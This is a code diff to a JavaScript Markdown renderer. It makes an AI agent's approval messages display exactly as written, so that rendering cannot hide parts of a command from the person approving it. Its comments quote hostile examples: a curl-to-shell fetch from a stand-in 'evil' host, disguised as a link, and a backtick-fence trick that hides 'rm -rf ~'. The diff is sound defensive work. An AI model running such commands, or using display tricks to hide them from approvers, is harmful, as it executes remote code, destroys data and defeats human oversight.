@@ -14,7 +14,7 @@
 // bare URLs. Images become links, never loads. Not covered: reference links, footnotes,
 // indented code, HTML. Code, and all of an approval's message, is drawn left to right with what
 // is not on screen as it runs shown as escapes (hidden-text.js, #220), and Copy takes what is drawn.
-// An approval's message is not Markdown outside its fences: it is drawn as written (parseApproval).
+// An approval's message is never Markdown: it is drawn exactly as written (parseApproval).
 
 import { hasRightToLeft, keepLineSeparators, reveal } from './hidden-text.js';
 
@@ -86,41 +86,21 @@ export function parseMarkdown(src) {
   return parseBlocks(raw.map(expandTabs), raw, 0);
 }
 
-// An approval's message as its card reads it (#220, #415): fenced code blocks, and everything
-// else as the literal source text it is, never Markdown. A Codex approval carries its command in
-// prose, and Markdown hid parts of it from the person approving: a link drew
-// `echo "[safe](https://a/";curl${IFS}https://evil/x|sh;")"` as `echo "safe"`, a code span joined
-// two lines into one comment, a backslash escape dropped its backslash, and emphasis dropped a
-// glob's stars. So no links, emphasis, escapes, code spans, lists or headings here; the text keeps
-// its line breaks (drawn pre-wrap). A fence opens only with an info string a fence's language
-// could be, since that string is not drawn: any other opening line is literal text too.
+// An approval's message as its card reads it (#220, #415): exactly as written, all of it, fence
+// markers included; nothing in it is read as Markdown. Approve once allows what runs, and every
+// structure a parser decides hid some of it. A Codex approval carries its command in prose: a link
+// drew `echo "[safe](https://a/";curl${IFS}https://evil/x|sh;")"` as `echo "safe"`, a code span
+// joined two lines into one comment, a backslash escape dropped its backslash, and emphasis
+// dropped a glob's stars. And a line of three backticks, a fence's marker, is a command
+// substitution in bash: `bash -c '` around a fenced `echo rm -rf ~` drew as a harmless echo in a
+// box, while bash runs `rm -rf ~`. So it is one block of text in the code face, its line breaks
+// kept (pre-wrap); only blank lines at its very start and end are left out.
 export function parseApproval(src) {
   const text = typeof src === 'string' ? src : '';
   const lines = keepLineSeparators(text).replace(/\r\n/g, '\n').split('\n');
-  const out = [];
-  let prose = [];
-  const flush = () => {
-    while (prose.length && blank(prose[0])) { prose.shift(); }
-    while (prose.length && blank(prose[prose.length - 1])) { prose.pop(); }
-    if (prose.length) { out.push(el('p', [prose.join('\n')], { class: 'md-literal' })); }
-    prose = [];
-  };
-  for (let i = 0; i < lines.length; i++) {
-    const m = /^ {0,3}(`{3,}|~{3,})[ \t]*([\w+.#-]*)[ \t]*$/.exec(lines[i]);
-    if (!m) { prose.push(lines[i]); continue; }
-    flush();
-    const marker = m[1];
-    const body = [];
-    for (i++; i < lines.length; i++) {
-      const close = /^ {0,3}(`{3,}|~{3,})[ \t]*$/.exec(lines[i]);
-      if (close && close[1][0] === marker[0] && close[1].length >= marker.length) { break; }
-      body.push(lines[i]);
-    }
-    // An unclosed fence runs to the end, as in CommonMark.
-    out.push(el('pre', [el('code', [body.join('\n')])]));
-  }
-  flush();
-  return out;
+  while (lines.length && blank(lines[0])) { lines.shift(); }
+  while (lines.length && blank(lines[lines.length - 1])) { lines.pop(); }
+  return lines.length ? [el('p', [lines.join('\n')], { class: 'md-literal' })] : [];
 }
 
 // lines: what structure is read from, leading tabs expanded and blank lines in list items
@@ -491,13 +471,11 @@ const RTL_TOO = { rightToLeft: true };
 export const codeText = (text) => reveal(text, RTL_TOO).replace(/\n+$/, '');
 
 // An approval's whole message as its card draws it (#220): its literal text (parseApproval) with
-// what is not on screen as it runs, right-to-left letters included, as escapes. A fence is left as
-// it is: every block is drawn so already (codeText), and still notes the right-to-left letters it
-// held.
+// what is not on screen as it runs, right-to-left letters included, as escapes.
 export function revealed(nodes) {
   return (nodes ?? []).map((n) => {
     if (typeof n === 'string') { return reveal(n, RTL_TOO); }
-    if (!n || typeof n !== 'object' || n.tag === 'pre') { return n; }
+    if (!n || typeof n !== 'object') { return n; }
     return { ...n, children: revealed(n.children) };
   });
 }
@@ -630,8 +608,8 @@ export function textOf(node) {
   return (node?.children ?? []).map(textOf).join('');
 }
 
-// approval: the text is an approval's message, drawn as its card draws it: fences, and the rest as
-// its literal source (parseApproval), revealed. The caller reads its container left to right.
+// approval: the text is an approval's message, drawn as its card draws it: exactly as written,
+// revealed, never Markdown (parseApproval). The caller reads its container left to right.
 export function renderMarkdown(text, doc = document, { approval = false } = {}) {
   return toDom(approval ? revealed(parseApproval(text)) : parseMarkdown(text), doc);
 }
